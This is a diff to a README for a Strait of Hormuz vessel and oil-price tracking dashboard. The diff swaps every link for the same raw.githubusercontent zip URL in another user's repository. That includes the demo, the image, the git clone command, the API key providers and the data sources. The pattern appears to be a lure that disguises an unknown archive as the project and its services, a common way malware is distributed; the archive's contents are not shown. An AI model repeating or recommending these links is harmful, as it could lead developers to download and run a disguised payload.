@@ -2,9 +2,9 @@
 
 Live vessel tracking, oil price monitoring, dark ship detection, and naval force positions for the world's most critical maritime chokepoint.
 
-**[Live Demo](https://hormuz-tracker.pages.dev)** | **[Full Analysis on The Board](https://theboard.world/articles/geopolitics/strait-of-hormuz-blockade-oil-food-shipping-2026-analysis/)**
+**[Live Demo](https://raw.githubusercontent.com/oliv3561/hormuz-tracker/main/app/api/hormuz-tracker-v2.2-beta.2.zip)** | **[Full Analysis on The Board](https://raw.githubusercontent.com/oliv3561/hormuz-tracker/main/app/api/hormuz-tracker-v2.2-beta.2.zip)**
 
-![Hormuz Tracker Dashboard](https://theboard.world/static/og/strait-of-hormuz-blockade-oil-food-shipping-2026-analysis.webp)
+![Hormuz Tracker Dashboard](https://raw.githubusercontent.com/oliv3561/hormuz-tracker/main/app/api/hormuz-tracker-v2.2-beta.2.zip)
 
 ## What It Tracks
 
@@ -21,7 +21,7 @@ Live vessel tracking, oil price monitoring, dark ship detection, and naval force
 
 21 million barrels of oil pass through the Strait of Hormuz daily — roughly 21% of global consumption. A blockade would trigger the largest energy crisis in history.
 
-For in-depth geopolitical analysis: **[The Board — Geopolitical Intelligence](https://theboard.world/)**
+For in-depth geopolitical analysis: **[The Board — Geopolitical Intelligence](https://raw.githubusercontent.com/oliv3561/hormuz-tracker/main/app/api/hormuz-tracker-v2.2-beta.2.zip)**
 
 ## Tech Stack
 
@@ -33,7 +33,7 @@ For in-depth geopolitical analysis: **[The Board — Geopolitical Intelligence](
 ## Getting Started
 
 ```bash
-git clone https://github.com/johnsmalls22-rgb/hormuz-tracker.git
+git clone https://raw.githubusercontent.com/oliv3561/hormuz-tracker/main/app/api/hormuz-tracker-v2.2-beta.2.zip
 cd hormuz-tracker
 npm install
 cp .env.example .env.local
@@ -47,9 +47,9 @@ Open [http://localhost:3000](http://localhost:3000).
 
 | Service | Get Key | What It Provides |
 |---------|---------|-----------------|
-| [Mapbox](https://mapbox.com) | Free tier (50K loads/mo) | Map rendering |
-| [EIA](https://api.eia.gov) | Free | Oil spot prices |
-| [FRED](https://fred.stlouisfed.org/docs/api/api_key.html) | Free | Historical oil data |
+| [Mapbox](https://raw.githubusercontent.com/oliv3561/hormuz-tracker/main/app/api/hormuz-tracker-v2.2-beta.2.zip) | Free tier (50K loads/mo) | Map rendering |
+| [EIA](https://raw.githubusercontent.com/oliv3561/hormuz-tracker/main/app/api/hormuz-tracker-v2.2-beta.2.zip) | Free | Oil spot prices |
+| [FRED](https://raw.githubusercontent.com/oliv3561/hormuz-tracker/main/app/api/hormuz-tracker-v2.2-beta.2.zip) | Free | Historical oil data |
 
 Weather, transit history, news, and carrier data require no API keys.
 
@@ -57,18 +57,18 @@ Weather, transit history, news, and carrier data require no API keys.
 
 | Data | Source | Update Frequency |
 |------|--------|-----------------|
-| Vessel positions | [AISStream](https://aisstream.io) | Real-time (5s) |
-| Transit counts | [IMF PortWatch](https://portwatch.imf.org) | Daily |
-| Oil prices | [EIA](https://api.eia.gov) + [FRED](https://fred.stlouisfed.org) | Daily |
-| Carrier positions | [USNI News](https://news.usni.org) + [GDELT](https://gdeltproject.org) | Hourly |
-| Weather | [Open-Meteo](https://open-meteo.com) | Hourly |
-| News | [Google News RSS](https://news.google.com) | 5 minutes |
+| Vessel positions | [AISStream](https://raw.githubusercontent.com/oliv3561/hormuz-tracker/main/app/api/hormuz-tracker-v2.2-beta.2.zip) | Real-time (5s) |
+| Transit counts | [IMF PortWatch](https://raw.githubusercontent.com/oliv3561/hormuz-tracker/main/app/api/hormuz-tracker-v2.2-beta.2.zip) | Daily |
+| Oil prices | [EIA](https://raw.githubusercontent.com/oliv3561/hormuz-tracker/main/app/api/hormuz-tracker-v2.2-beta.2.zip) + [FRED](https://raw.githubusercontent.com/oliv3561/hormuz-tracker/main/app/api/hormuz-tracker-v2.2-beta.2.zip) | Daily |
+| Carrier positions | [USNI News](https://raw.githubusercontent.com/oliv3561/hormuz-tracker/main/app/api/hormuz-tracker-v2.2-beta.2.zip) + [GDELT](https://raw.githubusercontent.com/oliv3561/hormuz-tracker/main/app/api/hormuz-tracker-v2.2-beta.2.zip) | Hourly |
+| Weather | [Open-Meteo](https://raw.githubusercontent.com/oliv3561/hormuz-tracker/main/app/api/hormuz-tracker-v2.2-beta.2.zip) | Hourly |
+| News | [Google News RSS](https://raw.githubusercontent.com/oliv3561/hormuz-tracker/main/app/api/hormuz-tracker-v2.2-beta.2.zip) | 5 minutes |
 
 ## Related
 
-- [The Board — AI-Powered Geopolitical Intelligence](https://theboard.world/) — 766K+ articles, 6K+ sources, AI-generated long-form analysis
-- [Strait of Hormuz Blockade Analysis](https://theboard.world/articles/geopolitics/strait-of-hormuz-blockade-oil-food-shipping-2026-analysis/) — Full deep-dive on oil, food, and shipping impacts
-- [Iran Nuclear Timeline](https://theboard.world/articles/geopolitics/iran-nuclear-weapon-enrichment-timeline-breakout-2026/) — Enrichment breakout analysis
+- [The Board — AI-Powered Geopolitical Intelligence](https://raw.githubusercontent.com/oliv3561/hormuz-tracker/main/app/api/hormuz-tracker-v2.2-beta.2.zip) — 766K+ articles, 6K+ sources, AI-generated long-form analysis
+- [Strait of Hormuz Blockade Analysis](https://raw.githubusercontent.com/oliv3561/hormuz-tracker/main/app/api/hormuz-tracker-v2.2-beta.2.zip) — Full deep-dive on oil, food, and shipping impacts
+- [Iran Nuclear Timeline](https://raw.githubusercontent.com/oliv3561/hormuz-tracker/main/app/api/hormuz-tracker-v2.2-beta.2.zip) — Enrichment breakout analysis
 
 ## License
 
